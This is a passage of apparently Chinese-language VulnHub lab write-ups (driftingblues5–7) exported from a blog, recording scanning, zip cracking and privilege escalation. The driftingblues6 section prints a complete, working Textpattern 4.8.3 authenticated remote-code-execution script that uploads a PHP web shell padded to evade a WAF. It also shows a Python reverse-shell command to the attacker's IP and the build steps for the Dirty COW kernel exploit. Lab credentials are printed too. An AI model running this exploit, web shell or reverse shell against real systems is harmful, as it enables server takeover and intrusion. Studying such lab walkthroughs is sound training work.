<li>稍等，拿到<code>root</code>凭证</li>
</ul>
<p><img data-src="./driftingblues5/7.png" alt></p>
<ul>
<li>查看凭证</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root creds</span><br><span class="line"></span><br><span class="line">imjustdrifting31</span><br></pre></td></tr></table></figure>

<ul>
<li>最终拿到<code>flag</code></li>
</ul>
<p><img data-src="./driftingblues5/8.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues5</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues6</title>
    <url>/2021/05/26/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues6/</url>
    <content><![CDATA[<h1 id="driftingblues6"><a href="#driftingblues6" class="headerlink" title="driftingblues6"></a>driftingblues6</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>driftingblues6</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.46</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	82:46:1b:4c:ff:3f	(Unknown: locally administered)</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.43.189	08:00:27:0e:d3:ad	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.949 seconds (131.35 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.189</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.189</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.189</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 07:32 EDT</span><br><span class="line">Nmap scan report for 192.168.43.189</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/textpattern/textpattern</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: driftingblues</span><br><span class="line">MAC Address: 08:00:27:0E:D3:AD (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues6/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.189/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.189/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.189/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/26 07:32:45 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 750]</span><br><span class="line">/index                (Status: 200) [Size: 750]</span><br><span class="line">/db                   (Status: 200) [Size: 53656]</span><br><span class="line">/robots               (Status: 200) [Size: 110]  </span><br><span class="line">/robots.txt           (Status: 200) [Size: 110]  </span><br><span class="line">/spammer              (Status: 200) [Size: 179]  </span><br><span class="line">/server-status        (Status: 403) [Size: 295]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/26 07:38:04 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.189/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">└─# gobuster dir -u http://192.168.43.189/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.189/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php,zip</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/26 07:36:25 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index                (Status: 200) [Size: 750]</span><br><span class="line">/index.html           (Status: 200) [Size: 750]</span><br><span class="line">/db                   (Status: 200) [Size: 53656]</span><br><span class="line">/robots               (Status: 200) [Size: 110]  </span><br><span class="line">/robots.txt           (Status: 200) [Size: 110]  </span><br><span class="line">/spammer.zip          (Status: 200) [Size: 179]  </span><br><span class="line">/spammer              (Status: 200) [Size: 179]  </span><br><span class="line">/server-status        (Status: 403) [Size: 295]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/26 07:42:18 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.189/textpattern/textpattern -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues6/2.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.189/robots.txt" target="_blank" rel="noopener">http://192.168.43.189/robots.txt</a></li>
</ul>
<p><img data-src="./driftingblues6/3.png" alt></p>
<p>提醒需要扫描<code>zip</code>文件</p>
<ul>
<li>访问<a href="http://192.168.43.189/spammer.zip" target="_blank" rel="noopener">http://192.168.43.189/spammer.zip</a></li>
</ul>
<p><img data-src="./driftingblues6/4.png" alt></p>
<h3 id="暴力破解zip"><a href="#暴力破解zip" class="headerlink" title="暴力破解zip"></a>暴力破解zip</h3><ul>
<li>打开提醒需要密码</li>
</ul>
<p><img data-src="./driftingblues6/5.png" alt></p>
<ul>
<li>破解密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./spammer.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues6]</span><br><span class="line">└─# fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./spammer.zip   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == myspace4</span><br></pre></td></tr></table></figure>

<ul>
<li>解压获得凭证<code>mayer / lionheart</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues6]</span><br><span class="line">└─# unzip spammer.zip   </span><br><span class="line">Archive:  spammer.zip</span><br><span class="line">[spammer.zip] creds.txt password: </span><br><span class="line"> extracting: creds.txt               </span><br><span class="line">                                                                                                             ┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues6]</span><br><span class="line">└─# ls</span><br><span class="line">creds.txt  spammer.zip</span><br><span class="line">                                                                                                             ┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues6]</span><br><span class="line">└─# cat creds.txt                                                                 </span><br><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure>

<h3 id="登录textpattern"><a href="#登录textpattern" class="headerlink" title="登录textpattern"></a>登录textpattern</h3><p><a href="http://192.168.43.189/textpattern/textpattern/index.php" target="_blank" rel="noopener">http://192.168.43.189/textpattern/textpattern/index.php</a></p>
<p><img data-src="./driftingblues6/6.png" alt></p>
<p><img data-src="./driftingblues6/7.png" alt></p>
<p>发现版本号为4.8.3</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><a href="https://www.exploit-db.com/exploits/48943" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/48943</a></p>
<p><a href="https://www.exploit-db.com/exploits/49620" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49620</a></p>
<ul>
<li>备注原生的<code>POC</code>解析网页会有一些问题</li>
<li>下面是修改之后的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Textpattern 4.8.3 - Remote code execution (Authenticated) (2)</span></span><br><span class="line"><span class="comment"># Date: 03/03/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: Ricardo Ruiz (@ricardojoserf)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://textpattern.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://textpattern.com/start</span></span><br><span class="line"><span class="comment"># Version: Previous to 4.8.3</span></span><br><span class="line"><span class="comment"># Tested on: CentOS, textpattern 4.5.7 and 4.6.0</span></span><br><span class="line"><span class="comment"># Install dependencies: pip3 install beautifulsoup4 argparse requests</span></span><br><span class="line"><span class="comment"># Example: python3 exploit.py -t http://example.com/ -u USER -p PASSWORD -c "whoami" -d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_args</span><span class="params">()</span>:</span></span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">'-t'</span>, <span class="string">'--target'</span>, required=<span class="literal">True</span>, action=<span class="string">'store'</span>, help=<span class="string">'Target url'</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--user'</span>, required=<span class="literal">True</span>, action=<span class="string">'store'</span>, help=<span class="string">'Username'</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--password'</span>, required=<span class="literal">True</span>, action=<span class="string">'store'</span>, help=<span class="string">'Password'</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--command'</span>, required=<span class="literal">False</span>, default=<span class="string">"whoami"</span>, action=<span class="string">'store'</span>, help=<span class="string">'Command to execute'</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-f'</span>, <span class="string">'--filename'</span>, required=<span class="literal">False</span>, default=<span class="string">"testing.php"</span>, action=<span class="string">'store'</span>, help=<span class="string">'PHP File Name to upload'</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--delete'</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'Delete PHP file after executing command'</span>)</span><br><span class="line">	my_args = parser.parse_args()</span><br><span class="line">	<span class="keyword">return</span> my_args</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_id</span><span class="params">(s, files_url, file_name)</span>:</span></span><br><span class="line">	r = s.get(files_url, verify=<span class="literal">False</span>)</span><br><span class="line">	soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> soup.findAll(<span class="string">'a'</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"file_download/"</span> <span class="keyword">in</span> a[<span class="string">'href'</span>]:</span><br><span class="line">			file_id_name = a[<span class="string">'href'</span>].split(<span class="string">'file_download/'</span>)[<span class="number">1</span>].split(<span class="string">"/"</span>)</span><br><span class="line">			<span class="keyword">if</span> file_id_name[<span class="number">1</span>] == file_name:</span><br><span class="line">				file_id = file_id_name[<span class="number">0</span>]</span><br><span class="line">				<span class="keyword">return</span> file_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(login_url, user, password)</span>:</span></span><br><span class="line">	s = requests.Session()</span><br><span class="line">	s.get(login_url, verify=<span class="literal">False</span>)</span><br><span class="line">	data = &#123;<span class="string">"p_userid"</span>:user, <span class="string">"p_password"</span>:password, <span class="string">"_txp_token"</span>:<span class="string">""</span>&#125;</span><br><span class="line">	r = s.post(login_url, data=data, verify=<span class="literal">False</span>)</span><br><span class="line">	<span class="keyword">if</span> str(r.status_code) == <span class="string">"401"</span>:</span><br><span class="line">		print(<span class="string">"[+] Invalid credentials"</span>)</span><br><span class="line">		sys.exit(<span class="number">0</span>)</span><br><span class="line">	_txp_token = <span class="string">""</span></span><br><span class="line">	<span class="comment">#soup = BeautifulSoup(r.text, "html.parser") # _txp_token</span></span><br><span class="line">	print(<span class="string">"r.text = &#123;0&#125;"</span>.format(r.text.find(<span class="string">"_txp_token"</span>)))</span><br><span class="line">	print(<span class="string">"r.text = &#123;0&#125;"</span>.format(r.text[r.text.find(<span class="string">"_txp_token"</span>)+<span class="number">13</span>:r.text.find(<span class="string">"_txp_token"</span>)+<span class="number">13</span>+<span class="number">32</span>]))</span><br><span class="line">	_txp_token = r.text[r.text.find(<span class="string">"_txp_token"</span>)+<span class="number">13</span>:r.text.find(<span class="string">"_txp_token"</span>)+<span class="number">13</span>+<span class="number">32</span>]</span><br><span class="line">	print(<span class="string">"_txp_token = &#123;0&#125;"</span>.format(_txp_token))</span><br><span class="line">	<span class="comment">#fields = soup.findAll('input')</span></span><br><span class="line">	<span class="comment">#for f in fields:</span></span><br><span class="line">	<span class="comment">#	if (f['name'] == "_txp_token"):</span></span><br><span class="line">	<span class="comment">#		_txp_token = f['value']</span></span><br><span class="line">	print(<span class="string">"session s = &#123;0&#125;"</span>.format(s))</span><br><span class="line">	<span class="keyword">return</span> s,_txp_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(s, login_url, _txp_token, file_name)</span>:</span></span><br><span class="line">	php_payload = <span class="string">'&lt;a&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.&lt;/a&gt;\n'</span>*<span class="number">1000</span> <span class="comment"># to avoid WAF problems</span></span><br><span class="line">	php_payload += <span class="string">'&lt;?php $test = shell_exec($_REQUEST[\'cmd\']); echo $test; ?&gt;'</span></span><br><span class="line">	s.post(login_url, files=((<span class="string">"MAX_FILE_SIZE"</span>, (<span class="literal">None</span>, <span class="string">"2000000"</span>)), (<span class="string">"event"</span>, (<span class="literal">None</span>, <span class="string">"file"</span>)), (<span class="string">"step"</span>, (<span class="literal">None</span>, <span class="string">"file_insert"</span>)), (<span class="string">"id"</span>, (<span class="literal">None</span>, <span class="string">""</span>)), (<span class="string">"sort"</span>, (<span class="literal">None</span>, <span class="string">""</span>)), (<span class="string">"dir"</span>, (<span class="literal">None</span>, <span class="string">""</span>)), (<span class="string">"page"</span>, (<span class="literal">None</span>, <span class="string">""</span>)), (<span class="string">"search_method"</span>, (<span class="literal">None</span>, <span class="string">""</span>)), (<span class="string">"crit"</span>, (<span class="literal">None</span>, <span class="string">""</span>)), (<span class="string">"thefile"</span>,(file_name, php_payload, <span class="string">'application/octet-stream'</span>)), (<span class="string">"_txp_token"</span>, (<span class="literal">None</span>, _txp_token)),), verify=<span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(s, cmd_url, command)</span>:</span></span><br><span class="line">	r = s.get(cmd_url+command, verify=<span class="literal">False</span>)</span><br><span class="line">	response = r.text.replace(<span class="string">"&lt;a&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.&lt;/a&gt;\n"</span>,<span class="string">""</span>)</span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file</span><span class="params">(s, login_url, file_id, _txp_token)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"selected[]"</span>:file_id,<span class="string">"edit_method"</span>:<span class="string">"delete"</span>,<span class="string">"event"</span>:<span class="string">"file"</span>,<span class="string">"step"</span>:<span class="string">"file_multi_edit"</span>,<span class="string">"page"</span>:<span class="string">"1"</span>,<span class="string">"sort"</span>:<span class="string">"filename"</span>,<span class="string">"dir"</span>:<span class="string">"asc"</span>,<span class="string">"_txp_token"</span>:_txp_token&#125;</span><br><span class="line">	s.post(login_url, data=data, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	args = get_args()</span><br><span class="line">	url = args.target</span><br><span class="line">	user = args.user</span><br><span class="line">	password = args.password</span><br><span class="line">	file_name = args.filename</span><br><span class="line">	command = args.command</span><br><span class="line">	delete_after_execute = args.delete</span><br><span class="line"></span><br><span class="line">	login_url =  url + <span class="string">"/textpattern/index.php"</span></span><br><span class="line">	upload_url = url + <span class="string">"/textpattern/index.php"</span></span><br><span class="line">	cmd_url =    url + <span class="string">"/files/"</span> + file_name + <span class="string">"?cmd="</span></span><br><span class="line">	files_url =  url + <span class="string">"/textpattern/index.php?event=file"</span></span><br><span class="line"></span><br><span class="line">	s,_txp_token = login(login_url, user, password)</span><br><span class="line">	print(<span class="string">"[+] Logged in"</span>)</span><br><span class="line">	upload(s, login_url, _txp_token, file_name)</span><br><span class="line">	file_id = get_file_id(s, files_url, file_name)</span><br><span class="line">	print(<span class="string">"[+] File uploaded with id %s"</span>%(file_id))</span><br><span class="line">	response = exec_cmd(s, cmd_url, command)</span><br><span class="line">	print(<span class="string">"[+] Command output \n%s"</span>%(response))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> delete_after_execute:</span><br><span class="line">		print(<span class="string">"[+] Deleting uploaded file %s with id %s"</span> %(file_name, file_id))</span><br><span class="line">		delete_file(s, login_url, file_id, _txp_token)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">"[+] File not deleted. Url: %s"</span>%(url + <span class="string">"/files/"</span> + file_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 1.py -t http://192.168.43.189/textpattern/ -u mayer -p lionheart -c "ls -al"</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues6/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 1.py -t http://192.168.43.189/textpattern/ -u mayer -p lionheart -c "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.43.46\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'</span><br><span class="line">"</span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img data-src="./driftingblues6/9.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./driftingblues6/10.png" alt></p>
<p>无果</p>
<ul>
<li>系统提权（脏牛）<a href="https://www.exploit-db.com/exploits/40839" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40839</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<ul>
<li>开始提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues6/11.png" alt></p>
<p><img data-src="./driftingblues6/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues6</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues7</title>
    <url>/2021/05/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues7/</url>
    <content><![CDATA[<h1 id="driftingblues7"><a href="#driftingblues7" class="headerlink" title="driftingblues7"></a>driftingblues7</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2021</li>
<li>driftingblues7</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	82:46:1b:4c:ff:3f	(Unknown: locally administered)</span><br><span class="line">192.168.43.21	08:00:27:17:76:59	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.969 seconds (130.02 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.21</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.21</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.21</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 07:33 EDT</span><br><span class="line">Nmap scan report for 192.168.43.21</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 65527 closed ports</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA)</span><br><span class="line">|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA)</span><br><span class="line">|_  256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519)</span><br><span class="line">66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.5</span><br><span class="line">|_http-title: Scalable Cost Effective Cloud Storage for Developers</span><br><span class="line">80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3</span><br><span class="line">|_http-title: Did not follow redirect to https://192.168.43.21/</span><br><span class="line">111/tcp  open  rpcbind         2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|_  100000  3,4          111/udp6  rpcbind</span><br><span class="line">443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3</span><br><span class="line">| http-title: EyesOfNetwork</span><br><span class="line">|_Requested resource was /login.php##</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2021-04-03T14:37:22</span><br><span class="line">|_Not valid after:  2022-04-03T14:37:22</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">2403/tcp open  taskmaster2000?</span><br><span class="line">3306/tcp open  mysql           MariaDB (unauthorized)</span><br><span class="line">8086/tcp open  http            InfluxDB http admin 1.7.9</span><br><span class="line">|_http-title: Site doesn't have a title (text/plain; charset=utf-8).</span><br><span class="line">MAC Address: 08:00:27:17:76:59 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 120.62 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u https://192.168.43.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u https://192.168.43.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     https://192.168.43.21/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/27 07:33:56 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Error: error on running gobuster: unable to connect to https://192.168.43.21/: invalid certificate: x509: cannot validate certificate for 192.168.43.21 because it doesn't contain any IP 